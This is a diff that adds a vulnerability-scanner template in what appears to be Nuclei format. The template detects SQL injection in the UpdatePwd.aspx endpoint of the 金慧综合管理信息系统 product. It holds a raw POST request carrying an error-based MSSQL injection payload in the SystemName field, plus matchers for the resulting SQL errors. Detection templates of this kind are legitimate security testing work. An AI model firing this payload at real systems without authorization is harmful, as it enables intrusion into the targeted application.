@@ -1,0 +1,42 @@
+id: goodwaysoft-updatepwd-aspx-sqli
+info:
+  name: 金慧综合管理信息系统 UpdatePwd.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+  description: |
+    This template detects SQL injection vulnerability in the UpdatePwd.aspx endpoint of 金慧综合管理信息系统.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /Portal/UpdatePwd.aspx?LoginName= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIwNjIxOTEwOWRkBbaTvhv%2ByWbTKSTVx1y6E7qFnAo%3D&__VIEWSTATEGENERATOR=7FC147DC&__EVENTVALIDATION=%2FwEdAAeBOWHyzxoRUImq0lfI2qvAUYglfMtBarbH2LeBEFZ3blwK8%2F1gnn25OldlRNyIedkf1P6GTiFbwnVHMajaCmuzDXCKeN7Biz3dpLrvtu21sFabMRbi%2F2A4oZV6XkcK0do6klUczeYxH4SdGieOR28Q1VJ0AFks4WshtgQDeQmeEVRN5uY%3D&SystemName='+or+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--&Password=&NewPassword1=&NewPassword2=&ButtonSave=%E7%A1%AE%E5%AE%9A
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "SqlException"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+        part: body
+      - type: regex
+        regex:
+          - "在将(.*?)值"
+        part: body
